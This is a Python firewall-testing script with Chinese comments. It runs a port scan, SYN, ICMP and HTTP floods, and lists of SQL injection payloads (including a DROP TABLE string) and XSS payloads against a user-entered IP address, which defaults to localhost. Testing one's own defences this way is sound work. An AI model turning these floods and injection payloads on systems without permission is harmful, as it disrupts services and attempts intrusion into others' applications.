import socket
import time
import random
import threading
import requests
from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP

class FirewallTester:
    def __init__(self, target_ip="127.0.0.1"):
        self.target_ip = target_ip
        self.ports = [22, 80, 443, 3389, 3306, 1433]  # 常见服务端口
        self.http_ports = [80, 443, 8080, 8443]
        self.sql_injections = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin' --",
            "1' OR '1'='1",
            "1' UNION SELECT NULL--"
        ]
        self.xss_attacks = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>"
        ]

    def port_scan(self):
        """测试端口扫描检测规则"""
        print("开始端口扫描测试...")
        for port in self.ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target_ip, port))
                if result == 0:
                    print(f"端口 {port} 开放")
                else:
                    print(f"端口 {port} 关闭")
                sock.close()
            except Exception as e:
                print(f"扫描端口 {port} 时出错: {str(e)}")
            time.sleep(0.5)  # 避免触发速率限制

    def syn_flood(self, duration=5):
        """测试SYN Flood防护规则"""
        print("开始SYN Flood攻击测试...")
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                # 随机源端口和目标端口
                sport = random.randint(1024, 65535)
                dport = random.choice(self.ports)
                
                # 构造SYN包
                packet = IP(dst=self.target_ip)/TCP(sport=sport, dport=dport, flags="S")
                send(packet, verbose=0)
                time.sleep(0.01)  # 控制发送速率
            except Exception as e:
                print(f"SYN Flood攻击出错: {str(e)}")

    def icmp_flood(self, duration=5):
        """测试ICMP Flood防护规则"""
        print("开始ICMP Flood攻击测试...")
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                packet = IP(dst=self.target_ip)/ICMP()
                send(packet, verbose=0)
                time.sleep(0.01)  # 控制发送速率
            except Exception as e:
                print(f"ICMP Flood攻击出错: {str(e)}")

    def http_flood(self, duration=5):
        """测试HTTP Flood防护规则"""
        print("开始HTTP Flood攻击测试...")
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                port = random.choice(self.http_ports)
                url = f"http://{self.target_ip}:{port}/"
                requests.get(url, timeout=1)
                time.sleep(0.1)  # 控制请求速率
            except Exception as e:
                print(f"HTTP Flood攻击出错: {str(e)}")

    def sql_injection_test(self):
        """测试SQL注入防护规则"""
        print("开始SQL注入测试...")
        for port in self.http_ports:
            for injection in self.sql_injections:
                try:
                    url = f"http://{self.target_ip}:{port}/login"
                    data = {"username": injection, "password": "test"}
                    requests.post(url, data=data, timeout=2)
                    print(f"测试SQL注入: {injection} 在端口 {port}")
                except Exception as e:
                    print(f"SQL注入测试出错: {str(e)}")
                time.sleep(1)

    def xss_test(self):
        """测试XSS攻击防护规则"""
        print("开始XSS攻击测试...")
        for port in self.http_ports:
            for xss in self.xss_attacks:
                try:
                    url = f"http://{self.target_ip}:{port}/search"
                    params = {"q": xss}
                    requests.get(url, params=params, timeout=2)
                    print(f"测试XSS攻击: {xss} 在端口 {port}")
                except Exception as e:
                    print(f"XSS攻击测试出错: {str(e)}")
                time.sleep(1)

    def run_all_tests(self):
        """运行所有测试"""
        print("开始防火墙规则测试...")
        
        # 创建测试线程
        tests = [
            threading.Thread(target=self.port_scan),
            threading.Thread(target=self.syn_flood),
            threading.Thread(target=self.icmp_flood),
            threading.Thread(target=self.http_flood),
            threading.Thread(target=self.sql_injection_test),
            threading.Thread(target=self.xss_test)
        ]
        
        # 启动所有测试
        for test in tests:
            test.start()
            time.sleep(1)  # 错开启动时间
        
        # 等待所有测试完成
        for test in tests:
            test.join()
        
        print("所有测试完成！")

if __name__ == "__main__":
    # 获取目标IP
    target_ip = input("请输入目标IP地址 (默认: 127.0.0.1): ") or "127.0.0.1"
    
    # 创建测试器并运行测试
    tester = FirewallTester(target_ip)
    tester.run_all_tests() 